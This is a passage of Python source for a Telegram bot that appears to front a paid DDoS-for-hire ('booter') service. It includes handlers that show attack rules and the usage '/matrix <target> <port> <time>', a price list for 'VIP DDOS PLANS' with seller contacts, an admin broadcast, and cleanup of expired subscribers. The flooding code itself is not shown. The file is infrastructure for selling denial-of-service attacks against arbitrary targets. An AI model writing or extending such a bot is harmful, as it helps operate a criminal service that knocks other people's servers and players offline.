    response = f'''
👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {user_name}!

🚀 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝗰𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗼𝘂𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲𝘀!
📝 𝗧𝘆𝗽𝗲 /help 𝘁𝗼 𝘃𝗶𝗲𝘄 𝗮𝗹𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀

📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
➡️ @MATRIX_CHEATS

👨‍💻 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝗣𝗮𝗻𝗲𝗹 𝗕𝘂𝘆: 
➡️ @its_MATRIX_King
👨‍💻 𝗢𝗪𝗡𝗘𝗥/𝗕𝗨𝗬:
➡️ @its_MATRIX_King
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_id = str(message.chat.id)
    users = read_users()
    
    if user_id in users or user_id in admin_id:
        user_name = message.from_user.first_name
        response = f'''
📜 𝗥𝗨𝗟𝗘𝗦 & 𝗚𝗨𝗜𝗗𝗘𝗟𝗜𝗡𝗘𝗦

👋 𝗛𝗲𝗹𝗹𝗼 {user_name}, 𝗣𝗹𝗲𝗮𝘀𝗲 𝗳𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀:

⏱️ 𝗧𝗶𝗺𝗲 𝗟𝗶𝗺𝗶𝘁:
• 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗽𝗲𝗿 𝗮𝘁𝘁𝗮𝗰𝗸
• 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 𝗮𝘁𝘁𝗮𝗰𝗸𝘀

⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁:
• 𝗔𝗹𝘄𝗮𝘆𝘀 𝗰𝗵𝗲𝗰𝗸 /status 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸
• 𝗪𝗮𝗶𝘁 𝗳𝗼𝗿 𝗼𝗻𝗴𝗼𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵

💡 𝗧𝗶𝗽𝘀:
• 𝗨𝘀𝗲 /matrix <𝘁𝗮𝗿𝗴𝗲𝘁> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>
• 𝗞𝗲𝗲𝗽 𝘆𝗼𝘂𝗿 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘀𝗮𝗳𝗲

📢 𝗦𝘁𝗮𝘆 𝗨𝗽𝗱𝗮𝘁𝗲𝗱:
➡️ @MATRIX_CHEATS

💫 𝗡𝗲𝗲𝗱 𝗛𝗲𝗹𝗽?
➡️ @its_MATRIX_King
'''
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''
🌟 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗣𝗟𝗔𝗡𝗦 🌟

👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗣𝗟𝗔𝗡𝗦:
━━━━━━━━━━━━━━━
⚡️ 1 𝗗𝗔𝗬 - 100₹
⚡️ 7 𝗗𝗔𝗬𝗦 - 350₹
⚡️ 30 𝗗𝗔𝗬𝗦 - 600₹
⚡️ 1 𝗦𝗘𝗔𝗦𝗢𝗡 - 1000₹

💫 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:
• 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝗔𝘁𝘁𝗮𝗰𝗸𝘀
• 24/7 𝗦𝘂𝗽𝗽𝗼𝗿𝘁
• 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗦𝗲𝗿𝘃𝗲𝗿𝘀
• 𝗛𝗶𝗴𝗵 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲

💎 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗡𝗢𝗪:
➡️ @its_MATRIX_King

📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
➡️ @MATRIX_CHEATS

⏰ 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗜𝗠𝗘 𝗢𝗙𝗙𝗘𝗥
'''
    bot.reply_to(message, response)

# Handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            users = read_users()  # Get users from Redis
            if users:
                for user in users:
                    try:
                        bot.send_message(user, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users."
            else:
                response = "No users found in the system."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

import threading

def cleanup_thread():
    while True:
        clean_expired_users()
        time.sleep(60)  # Check every minute

# Start the cleanup thread
cleanup_thread = threading.Thread(target=cleanup_thread, daemon=True)
cleanup_thread.start()

def cleanup_task():
    while True:
        clean_expired_users()
        time.sleep(60)  # Check every minute

def run_bot():
    create_tables()
    
    # Start the cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
    cleanup_thread.start()
    
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            logging.error(f"Bot error: {e}")
            time.sleep(15)

if __name__ == "__main__":
    run_bot()

